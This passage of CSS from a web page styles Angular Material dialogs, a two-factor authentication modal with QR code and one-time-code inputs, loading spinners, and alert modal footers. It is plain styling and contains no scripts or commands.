      transition: opacity 75ms linear, transform 150ms 0ms cubic-bezier(0, 0, 0.2, 1)
    }

    .mdc-dialog--closing .mdc-dialog__scrim,
    .mdc-dialog--closing .mdc-dialog__container {
      transition: opacity 75ms linear
    }

    .mdc-dialog--closing .mdc-dialog__container {
      transform: none
    }

    .mdc-dialog--open .mdc-dialog__scrim {
      opacity: 1
    }

    .mdc-dialog--open .mdc-dialog__container {
      transform: none;
      opacity: 1
    }

    .mdc-dialog--open.mdc-dialog__surface-scrim--shown .mdc-dialog__surface-scrim {
      opacity: 1
    }

    .mdc-dialog--open.mdc-dialog__surface-scrim--hiding .mdc-dialog__surface-scrim {
      transition: opacity 75ms linear
    }

    .mdc-dialog--open.mdc-dialog__surface-scrim--showing .mdc-dialog__surface-scrim {
      transition: opacity 150ms linear
    }

    .mdc-dialog__surface-scrim {
      display: none;
      opacity: 0;
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1
    }

    .mdc-dialog__surface-scrim--shown .mdc-dialog__surface-scrim,
    .mdc-dialog__surface-scrim--showing .mdc-dialog__surface-scrim,
    .mdc-dialog__surface-scrim--hiding .mdc-dialog__surface-scrim {
      display: block
    }

    .mdc-dialog-scroll-lock {
      overflow: hidden
    }

    .mdc-dialog--no-content-padding .mdc-dialog__content {
      padding: 0
    }

    .mdc-dialog--sheet .mdc-dialog__close {
      right: 12px;
      top: 9px;
      position: absolute;
      z-index: 1
    }

    .mdc-dialog__scrim--removed {
      pointer-events: none
    }

    .mdc-dialog__scrim--removed .mdc-dialog__scrim,
    .mdc-dialog__scrim--removed .mdc-dialog__surface-scrim {
      display: none
    }

    .mat-mdc-dialog-content {
      max-height: 65vh
    }

    .mat-mdc-dialog-container {
      position: static;
      display: block
    }

    .mat-mdc-dialog-container,
    .mat-mdc-dialog-container .mdc-dialog__container,
    .mat-mdc-dialog-container .mdc-dialog__surface {
      max-height: inherit;
      min-height: inherit;
      min-width: inherit;
      max-width: inherit
    }

    .mat-mdc-dialog-container .mdc-dialog__surface {
      display: block;
      width: 100%;
      height: 100%
    }

    .mat-mdc-dialog-container {
      outline: 0
    }

    .mat-mdc-dialog-container .mdc-dialog__surface {
      background-color: var(--mdc-dialog-container-color, white)
    }

    .mat-mdc-dialog-container .mdc-dialog__surface {
      box-shadow: var(--mdc-dialog-container-elevation, 0px 11px 15px -7px rgba(0, 0, 0, 0.2), 0px 24px 38px 3px rgba(0, 0, 0, 0.14), 0px 9px 46px 8px rgba(0, 0, 0, 0.12))
    }

    .mat-mdc-dialog-container .mdc-dialog__surface {
      border-radius: var(--mdc-dialog-container-shape, var(--mdc-shape-medium, 4px))
    }

    .mat-mdc-dialog-container.mdc-dialog--scrollable .mdc-dialog__title,
    .mat-mdc-dialog-container.mdc-dialog--scrollable .mdc-dialog__actions,
    .mat-mdc-dialog-container.mdc-dialog--scrollable.mdc-dialog-scroll-divider-footer .mdc-dialog__actions {
      border-color: var(--mdc-dialog-with-divider-divider-color, black)
    }

    .mat-mdc-dialog-container.mdc-dialog--scrollable .mdc-dialog__title {
      border-bottom-color: var(--mdc-dialog-with-divider-divider-color, black)
    }

    .mat-mdc-dialog-container .mdc-dialog__title {
      font-family: var(--mdc-dialog-subhead-font, "Arial");
      line-height: var(--mdc-dialog-subhead-line-height, 14px);
      font-size: var(--mdc-dialog-subhead-size, 14px);
      font-weight: var(--mdc-dialog-subhead-weight, 500);
      letter-spacing: var(--mdc-dialog-subhead-tracking, 1px)
    }

    .mat-mdc-dialog-container .mdc-dialog__title {
      color: var(--mdc-dialog-subhead-color, black)
    }

    .mat-mdc-dialog-container .mdc-dialog__content {
      font-family: var(--mdc-dialog-supporting-text-font, "Arial");
      line-height: var(--mdc-dialog-supporting-text-line-height, 14px);
      font-size: var(--mdc-dialog-supporting-text-size, 14px);
      font-weight: var(--mdc-dialog-supporting-text-weight, 500);
      letter-spacing: var(--mdc-dialog-supporting-text-tracking, 1px)
    }

    .mat-mdc-dialog-container .mdc-dialog__content {
      color: var(--mdc-dialog-supporting-text-color, black)
    }

    .mat-mdc-dialog-container .mdc-dialog__container {
      transition-duration: var(--mat-dialog-transition-duration, 0ms)
    }

    .mat-mdc-dialog-container._mat-animation-noopable .mdc-dialog__container {
      transition: none
    }

    .mat-mdc-dialog-content {
      display: block
    }

    .mat-mdc-dialog-actions {
      justify-content: start
    }

    .mat-mdc-dialog-actions.mat-mdc-dialog-actions-align-center,
    .mat-mdc-dialog-actions[align=center] {
      justify-content: center
    }

    .mat-mdc-dialog-actions.mat-mdc-dialog-actions-align-end,
    .mat-mdc-dialog-actions[align=end] {
      justify-content: flex-end
    }

    .mat-mdc-dialog-actions .mat-button-base+.mat-button-base,
    .mat-mdc-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base {
      margin-left: 8px
    }

    [dir=rtl] .mat-mdc-dialog-actions .mat-button-base+.mat-button-base,
    [dir=rtl] .mat-mdc-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base {
      margin-left: 0;
      margin-right: 8px
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c238_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c238_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .modal-two-factor-auth .modal-close-icon {
      display: none
    }

    .modal-two-factor-auth .close-2fa {
      float: right;
      padding-top: 10px;
      padding-right: 5px;
      background-color: transparent;
      border: initial;
      cursor: pointer
    }

    .modal-two-factor-auth.qr .adl-content-2fa,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa {
      padding: 30px 15px 20px
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr {
      grid-area: qr-container
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img>div,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img>div {
      border-color: #eef0f3;
      padding: 10px !important
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img .new-code,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img .new-code {
      grid-area: new-code;
      display: none;
      font-size: 12px
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img .new-code:hover,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img .new-code:hover {
      text-decoration: none !important
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img .new-code .icon-reload,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img .new-code .icon-reload {
      position: relative;
      top: 6px;
      font-size: 24px;
      color: #414a53
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img #img-qr,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img #img-qr {
      margin: auto;
      grid-area: img-qr
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img #img-qr img,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img #img-qr img {
      width: 264px;
      height: 264px
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img #right-img,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img #right-img {
      margin: auto;
      grid-area: right-img;
      display: none
    }

    @media (min-width: 576px) {

      .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img #right-img,
      .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img #right-img {
        display: initial;
        width: 150px
      }
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img.with-right-image,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img.with-right-image {
      margin-bottom: 25px
    }

    @media (min-width: 576px) {

      .modal-two-factor-auth.qr .adl-content-2fa .content-qr-img.with-right-image,
      .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-img.with-right-image {
        display: grid;
        grid-area: qr-container;
        grid-template-columns: repeat(2, auto);
        grid-template-rows: repeat(2, auto);
        gap: 5px 15px;
        grid-template-areas: "img-qr right-img" "new-code new-code";
        grid-auto-flow: dense
      }
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-information,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-information {
      margin-bottom: 30px
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-information .list-group-item,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-information .list-group-item {
      padding: 12px 0 12px 30px;
      font-size: 16px;
      color: #283747;
      border: initial;
      text-align: left;
      position: relative;
      line-height: 1.38
    }

    .modal-two-factor-auth.qr .adl-content-2fa .content-qr-information .list-group-item .circle,
    .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-information .list-group-item .circle {
      font-size: 14px;
      font-weight: 700;
      position: absolute;
      top: 12px;
      left: 0;
      background-color: #0048db;
      color: #fff;
      padding: 2px 6px;
      border-radius: 50%;
      width: 20px;
      height: 20px
    }

    @media (min-width: 768px) {

      .modal-two-factor-auth.qr .adl-content-2fa,
      .modal-two-factor-auth.qr-enhanced .adl-content-2fa {
        padding: 40px 24px 32px
      }

      .modal-two-factor-auth.qr .adl-content-2fa .content-qr-information .list-group,
      .modal-two-factor-auth.qr-enhanced .adl-content-2fa .content-qr-information .list-group {
        padding-left: 20px
      }
    }

    .modal-two-factor-auth.qr-enhanced .content-qr-img #img-qr {
      border: 1px solid #DEE1E4
    }

    .modal-two-factor-auth .adl-content-2fa {
      text-align: center;
      padding: 50px 20px 20px
    }

    .modal-two-factor-auth .title {
      font-size: 20px;
      font-weight: 700
    }

    .modal-two-factor-auth .description {
      font-size: 16px
    }

    .modal-two-factor-auth .content-otp {
      margin-bottom: 30px !important
    }

    .modal-two-factor-auth .content-otp input {
      width: 33px !important;
      height: 33px !important;
      margin-left: 3.7px;
      border-radius: 7px;
      border: solid 1px #283747;
      box-shadow: initial !important
    }

    .modal-two-factor-auth .content-otp input:focus {
      border-color: #0048db !important;
      box-shadow: 0 2px 4px #0048db !important
    }

    .modal-two-factor-auth .without-received {
      font-size: 14px;
      margin: 30px 0 !important
    }

    .modal-two-factor-auth .timer {
      font-size: 16px
    }

    .modal-two-factor-auth .timer .seconds {
      color: #0048db
    }

    .modal-two-factor-auth .new-code {
      margin-bottom: 30px
    }

    .modal-two-factor-auth .qr-information {
      margin: 0 24px 24px
    }

    .modal-two-factor-auth .qr-information ol li {
      text-align: left;
      border: 0;
      font-size: 16px;
      line-height: 28px;
      font-weight: 400;
      color: #252b31
    }

    .modal-two-factor-auth .buttons {
      display: flex;
      flex-direction: column-reverse;
      align-items: center
    }

    .modal-two-factor-auth .buttons .continue {
      width: 290px;
      padding: 16px 0;
      max-width: 170px
    }

    @media (min-width: 768px) {
      .modal-two-factor-auth .buttons .continue {
        padding: 13px 1.75rem;
        max-width: initial
      }
    }

    .modal-two-factor-auth .title-qr-enhanced {
      padding: 32px 24px 0;
      font-size: 20px;
      line-height: 32px;
      font-weight: 700;
      color: #252b31;
      text-align: center
    }
  </style>
  <style>
    .adl-content-2fa .invalid-input,
    .adl-content-2fa.invalid-otp .content-otp fieldset .invalid-otp-input,
    .adl-content-2fa .content-otp fieldset input.ng-invalid:not(.ng-untouched) {
      border-color: red;
      box-shadow: 0 0 5px red inset
    }

    .adl-content-2fa * {
      margin: 0;
      padding: 0
    }

    .adl-content-2fa .img-icon {
      margin-bottom: 30px
    }

    .adl-content-2fa .title {
      margin-bottom: 10px
    }

    .adl-content-2fa .description {
      margin-bottom: 30px
    }

    .adl-content-2fa .without-received {
      margin-bottom: 10px
    }

    .adl-content-2fa .timer {
      margin-bottom: 30px
    }

    .adl-content-2fa .content-otp fieldset {
      border: none
    }

    .adl-content-2fa .content-otp fieldset input[type=number]::-webkit-inner-spin-button,
    .adl-content-2fa .content-otp fieldset input[type=number]::-webkit-outer-spin-button {
      -webkit-appearance: none;
      margin: 0
    }

    .adl-content-2fa .content-otp fieldset input[type=number] {
      -moz-appearance: textfield
    }

    .adl-content-2fa .content-otp fieldset input {
      border-radius: 3px;
      font-size: 20px;
      height: 45px;
      margin: 0 0 0 3px;
      outline: none;
      text-align: center;
      transition: all .2s ease-in-out;
      width: 45px
    }

    .adl-content-2fa .content-otp fieldset input:focus {
      border-color: purple;
      box-shadow: 0 0 5px purple inset
    }

    .adl-content-2fa .content-otp fieldset input::selection {
      background: transparent
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c135_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c135_spin {
      to {
        transform: rotate(360deg)
      }
    }

    @keyframes _ngcontent-qmv-c135_spinner-border {
      to {
        transform: rotate(360deg)
      }
    }

    .spinner-border[_ngcontent-qmv-c135],
    .avv-alert-newerror .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-exit .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-delete .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-success .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-pending .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-error .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-newerror .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-cancel .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-exit .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-delete .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-success .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-pending .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-error .avv-modal .modal-footer .btn-new.loading span {
      display: inline-block;
      width: 2rem;
      height: 2rem;
      vertical-align: text-bottom;
      border: .25em solid currentColor;
      border-right-color: transparent;
      border-radius: 50%;
      animation: _ngcontent-qmv-c135_spinner-border .75s linear infinite
    }

    .spinner-border-sm[_ngcontent-qmv-c135] {
      width: 1rem;
      height: 1rem;
      border-width: .2em
    }

    @keyframes _ngcontent-qmv-c135_spinner-grow {
      0% {
        transform: scale(0)
      }

      50% {
        opacity: 1
      }
    }

    .spinner-grow[_ngcontent-qmv-c135] {
      display: inline-block;
      width: 2rem;
      height: 2rem;
      vertical-align: text-bottom;
      background-color: currentColor;
      border-radius: 50%;
      opacity: 0;
      animation: _ngcontent-qmv-c135_spinner-grow .75s linear infinite
    }

    .spinner-grow-sm[_ngcontent-qmv-c135] {
      width: 1rem;
      height: 1rem
    }

    .avv-alert-newerror .avv-modal .modal-footer.modal-footer-column,
    .avv-alert-newnotification .avv-modal .modal-footer.modal-footer-column,
    .avv-alert-cancel .avv-modal .modal-footer.modal-footer-column,
    .avv-alert-exit .avv-modal .modal-footer.modal-footer-column,
    .avv-alert-delete .avv-modal .modal-footer.modal-footer-column,
    .avv-alert-success .avv-modal .modal-footer.modal-footer-column,
    .avv-alert-pending .avv-modal .modal-footer.modal-footer-column,
    .avv-alert-error .avv-modal .modal-footer.modal-footer-column {
      flex-direction: column;
      padding-top: 24px
    }

    .avv-alert-newerror .avv-modal .modal-footer .transparent-message,
    .avv-alert-newnotification .avv-modal .modal-footer .transparent-message,
    .avv-alert-cancel .avv-modal .modal-footer .transparent-message,
    .avv-alert-exit .avv-modal .modal-footer .transparent-message,
    .avv-alert-delete .avv-modal .modal-footer .transparent-message,
    .avv-alert-success .avv-modal .modal-footer .transparent-message,
    .avv-alert-pending .avv-modal .modal-footer .transparent-message,
    .avv-alert-error .avv-modal .modal-footer .transparent-message {
      margin-bottom: 24px;
      display: flex;
      background-color: transparent;
      border-radius: 4px;
      padding: 8px 10px 8px 8px
    }

    .avv-alert-newerror .avv-modal .modal-footer .transparent-message span.icon,
    .avv-alert-newnotification .avv-modal .modal-footer .transparent-message span.icon,
    .avv-alert-cancel .avv-modal .modal-footer .transparent-message span.icon,
    .avv-alert-exit .avv-modal .modal-footer .transparent-message span.icon,
    .avv-alert-delete .avv-modal .modal-footer .transparent-message span.icon,
    .avv-alert-success .avv-modal .modal-footer .transparent-message span.icon,
    .avv-alert-pending .avv-modal .modal-footer .transparent-message span.icon,
    .avv-alert-error .avv-modal .modal-footer .transparent-message span.icon {
      font-size: 16px;
      margin-right: 8px;
      color: transparent
    }

    .avv-alert-newerror .avv-modal .modal-footer .transparent-message p.text,
    .avv-alert-newnotification .avv-modal .modal-footer .transparent-message p.text,
    .avv-alert-cancel .avv-modal .modal-footer .transparent-message p.text,
    .avv-alert-exit .avv-modal .modal-footer .transparent-message p.text,
    .avv-alert-delete .avv-modal .modal-footer .transparent-message p.text,
    .avv-alert-success .avv-modal .modal-footer .transparent-message p.text,
    .avv-alert-pending .avv-modal .modal-footer .transparent-message p.text,
    .avv-alert-error .avv-modal .modal-footer .transparent-message p.text {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400;
      color: #283747;
      margin: 0
    }

    .avv-alert-newerror .avv-modal .modal-footer .transparent-message p,
    .avv-alert-newnotification .avv-modal .modal-footer .transparent-message p,
    .avv-alert-cancel .avv-modal .modal-footer .transparent-message p,
    .avv-alert-exit .avv-modal .modal-footer .transparent-message p,
    .avv-alert-delete .avv-modal .modal-footer .transparent-message p,
    .avv-alert-success .avv-modal .modal-footer .transparent-message p,
    .avv-alert-pending .avv-modal .modal-footer .transparent-message p,
    .avv-alert-error .avv-modal .modal-footer .transparent-message p {
      font-size: 14px !important;
      text-align: center
    }

    .avv-alert-newerror .avv-modal .modal-footer .info-message,
    .avv-alert-newnotification .avv-modal .modal-footer .info-message,
    .avv-alert-cancel .avv-modal .modal-footer .info-message,
    .avv-alert-exit .avv-modal .modal-footer .info-message,
    .avv-alert-delete .avv-modal .modal-footer .info-message,
    .avv-alert-success .avv-modal .modal-footer .info-message,
    .avv-alert-pending .avv-modal .modal-footer .info-message,
    .avv-alert-error .avv-modal .modal-footer .info-message {
      margin-bottom: 24px;
      display: flex;
      background-color: #dfeaff;
      border-radius: 4px;
      padding: 8px 10px 8px 8px
    }

    .avv-alert-newerror .avv-modal .modal-footer .info-message span.icon,
    .avv-alert-newnotification .avv-modal .modal-footer .info-message span.icon,
    .avv-alert-cancel .avv-modal .modal-footer .info-message span.icon,
    .avv-alert-exit .avv-modal .modal-footer .info-message span.icon,
    .avv-alert-delete .avv-modal .modal-footer .info-message span.icon,
    .avv-alert-success .avv-modal .modal-footer .info-message span.icon,
    .avv-alert-pending .avv-modal .modal-footer .info-message span.icon,
    .avv-alert-error .avv-modal .modal-footer .info-message span.icon {
      font-size: 16px;
      margin-right: 8px;
      color: #0054bf
    }

    .avv-alert-newerror .avv-modal .modal-footer .info-message p.text,
    .avv-alert-newnotification .avv-modal .modal-footer .info-message p.text,
    .avv-alert-cancel .avv-modal .modal-footer .info-message p.text,
    .avv-alert-exit .avv-modal .modal-footer .info-message p.text,
    .avv-alert-delete .avv-modal .modal-footer .info-message p.text,
    .avv-alert-success .avv-modal .modal-footer .info-message p.text,
    .avv-alert-pending .avv-modal .modal-footer .info-message p.text,
    .avv-alert-error .avv-modal .modal-footer .info-message p.text {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400;
      color: #283747;
      margin: 0
    }

    .avv-alert-newerror .avv-modal .modal-footer .avv-error-message,
    .avv-alert-newnotification .avv-modal .modal-footer .avv-error-message,
    .avv-alert-cancel .avv-modal .modal-footer .avv-error-message,
    .avv-alert-exit .avv-modal .modal-footer .avv-error-message,
    .avv-alert-delete .avv-modal .modal-footer .avv-error-message,
    .avv-alert-success .avv-modal .modal-footer .avv-error-message,
    .avv-alert-pending .avv-modal .modal-footer .avv-error-message,
    .avv-alert-error .avv-modal .modal-footer .avv-error-message {
      margin-bottom: 16px;
      display: flex;
      background-color: #fdced0;
      border-radius: 4px;
      padding: 8px 10px 8px 8px
    }

    .avv-alert-newerror .avv-modal .modal-footer .avv-error-message span.icon,
    .avv-alert-newnotification .avv-modal .modal-footer .avv-error-message span.icon,
    .avv-alert-cancel .avv-modal .modal-footer .avv-error-message span.icon,
    .avv-alert-exit .avv-modal .modal-footer .avv-error-message span.icon,
    .avv-alert-delete .avv-modal .modal-footer .avv-error-message span.icon,
    .avv-alert-success .avv-modal .modal-footer .avv-error-message span.icon,
    .avv-alert-pending .avv-modal .modal-footer .avv-error-message span.icon,
    .avv-alert-error .avv-modal .modal-footer .avv-error-message span.icon {
      font-size: 16px;
      margin-right: 8px;
      color: #d0021b
    }

    .avv-alert-newerror .avv-modal .modal-footer .avv-error-message p.text,
    .avv-alert-newnotification .avv-modal .modal-footer .avv-error-message p.text,
    .avv-alert-cancel .avv-modal .modal-footer .avv-error-message p.text,
    .avv-alert-exit .avv-modal .modal-footer .avv-error-message p.text,
    .avv-alert-delete .avv-modal .modal-footer .avv-error-message p.text,
    .avv-alert-success .avv-modal .modal-footer .avv-error-message p.text,
    .avv-alert-pending .avv-modal .modal-footer .avv-error-message p.text,
    .avv-alert-error .avv-modal .modal-footer .avv-error-message p.text {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400;
      color: #283747;
      margin: 0
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-primary,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-primary,
    .avv-alert-cancel .avv-modal .modal-footer .btn-primary,
    .avv-alert-exit .avv-modal .modal-footer .btn-primary,
    .avv-alert-delete .avv-modal .modal-footer .btn-primary,
    .avv-alert-success .avv-modal .modal-footer .btn-primary,
    .avv-alert-pending .avv-modal .modal-footer .btn-primary,
    .avv-alert-error .avv-modal .modal-footer .btn-primary {
      max-width: 100%
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-new,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-new,
    .avv-alert-cancel .avv-modal .modal-footer .btn-new,
    .avv-alert-exit .avv-modal .modal-footer .btn-new,
    .avv-alert-delete .avv-modal .modal-footer .btn-new,
    .avv-alert-success .avv-modal .modal-footer .btn-new,
    .avv-alert-pending .avv-modal .modal-footer .btn-new,
    .avv-alert-error .avv-modal .modal-footer .btn-new {
      height: 48px !important;
      transition: .3s;
      border: 1px solid
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-new .icon-descarga,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-new .icon-descarga,
    .avv-alert-cancel .avv-modal .modal-footer .btn-new .icon-descarga,
    .avv-alert-exit .avv-modal .modal-footer .btn-new .icon-descarga,
    .avv-alert-delete .avv-modal .modal-footer .btn-new .icon-descarga,
    .avv-alert-success .avv-modal .modal-footer .btn-new .icon-descarga,
    .avv-alert-pending .avv-modal .modal-footer .btn-new .icon-descarga,
    .avv-alert-error .avv-modal .modal-footer .btn-new .icon-descarga {
      font-size: 24px;
      margin-left: 10px;
      vertical-align: bottom
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-new:hover,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-new:hover,
    .avv-alert-cancel .avv-modal .modal-footer .btn-new:hover,
    .avv-alert-exit .avv-modal .modal-footer .btn-new:hover,
    .avv-alert-delete .avv-modal .modal-footer .btn-new:hover,
    .avv-alert-success .avv-modal .modal-footer .btn-new:hover,
    .avv-alert-pending .avv-modal .modal-footer .btn-new:hover,
    .avv-alert-error .avv-modal .modal-footer .btn-new:hover {
      cursor: pointer;
      color: #fff;
      background: #0014A2
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-new.loading,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-new.loading,
    .avv-alert-cancel .avv-modal .modal-footer .btn-new.loading,
    .avv-alert-exit .avv-modal .modal-footer .btn-new.loading,
    .avv-alert-delete .avv-modal .modal-footer .btn-new.loading,
    .avv-alert-success .avv-modal .modal-footer .btn-new.loading,
    .avv-alert-pending .avv-modal .modal-footer .btn-new.loading,
    .avv-alert-error .avv-modal .modal-footer .btn-new.loading {
      font-size: 0
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-new.loading:hover,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-new.loading:hover,
    .avv-alert-cancel .avv-modal .modal-footer .btn-new.loading:hover,
    .avv-alert-exit .avv-modal .modal-footer .btn-new.loading:hover,
    .avv-alert-delete .avv-modal .modal-footer .btn-new.loading:hover,
    .avv-alert-success .avv-modal .modal-footer .btn-new.loading:hover,
    .avv-alert-pending .avv-modal .modal-footer .btn-new.loading:hover,
    .avv-alert-error .avv-modal .modal-footer .btn-new.loading:hover {
      cursor: inherit
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-cancel .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-exit .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-delete .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-success .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-pending .avv-modal .modal-footer .btn-new.loading span,
    .avv-alert-error .avv-modal .modal-footer .btn-new.loading span {
      font-size: 14px;
      color: #c3cfe2
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-new.loading span:before,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-new.loading span:before,
    .avv-alert-cancel .avv-modal .modal-footer .btn-new.loading span:before,
    .avv-alert-exit .avv-modal .modal-footer .btn-new.loading span:before,
    .avv-alert-delete .avv-modal .modal-footer .btn-new.loading span:before,
    .avv-alert-success .avv-modal .modal-footer .btn-new.loading span:before,
    .avv-alert-pending .avv-modal .modal-footer .btn-new.loading span:before,
    .avv-alert-error .avv-modal .modal-footer .btn-new.loading span:before {
      display: none
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-close,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close,
    .avv-alert-exit .avv-modal .modal-footer .btn-close,
    .avv-alert-delete .avv-modal .modal-footer .btn-close,
    .avv-alert-success .avv-modal .modal-footer .btn-close,
    .avv-alert-pending .avv-modal .modal-footer .btn-close,
    .avv-alert-error .avv-modal .modal-footer .btn-close {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      color: #0048db
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-close span,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close span,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close span,
    .avv-alert-exit .avv-modal .modal-footer .btn-close span,
    .avv-alert-delete .avv-modal .modal-footer .btn-close span,
    .avv-alert-success .avv-modal .modal-footer .btn-close span,
    .avv-alert-pending .avv-modal .modal-footer .btn-close span,
    .avv-alert-error .avv-modal .modal-footer .btn-close span {
      font-size: 24px;
      color: #343a40;
      margin-right: 5px;
      transition: .3s
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-close:hover,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close:hover,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close:hover,
    .avv-alert-exit .avv-modal .modal-footer .btn-close:hover,
    .avv-alert-delete .avv-modal .modal-footer .btn-close:hover,
    .avv-alert-success .avv-modal .modal-footer .btn-close:hover,
    .avv-alert-pending .avv-modal .modal-footer .btn-close:hover,
    .avv-alert-error .avv-modal .modal-footer .btn-close:hover {
      text-decoration: none;
      color: #0048db
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-close:hover span,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close:hover span,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close:hover span,
    .avv-alert-exit .avv-modal .modal-footer .btn-close:hover span,
    .avv-alert-delete .avv-modal .modal-footer .btn-close:hover span,
    .avv-alert-success .avv-modal .modal-footer .btn-close:hover span,
    .avv-alert-pending .avv-modal .modal-footer .btn-close:hover span,
    .avv-alert-error .avv-modal .modal-footer .btn-close:hover span {
      color: #0048db
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-close.loading,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close.loading,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close.loading,
    .avv-alert-exit .avv-modal .modal-footer .btn-close.loading,
    .avv-alert-delete .avv-modal .modal-footer .btn-close.loading,
    .avv-alert-success .avv-modal .modal-footer .btn-close.loading,
    .avv-alert-pending .avv-modal .modal-footer .btn-close.loading,
    .avv-alert-error .avv-modal .modal-footer .btn-close.loading {
      font-size: 0
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-close.loading:hover,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close.loading:hover,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close.loading:hover,
    .avv-alert-exit .avv-modal .modal-footer .btn-close.loading:hover,
    .avv-alert-delete .avv-modal .modal-footer .btn-close.loading:hover,
    .avv-alert-success .avv-modal .modal-footer .btn-close.loading:hover,
    .avv-alert-pending .avv-modal .modal-footer .btn-close.loading:hover,
    .avv-alert-error .avv-modal .modal-footer .btn-close.loading:hover {
      cursor: inherit
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-exit .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-delete .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-success .avv-modal .modal-footer .btn-close.loading span,
    .avv-alert-pending .avv-modal .modal-footer .btn-close.loading span,
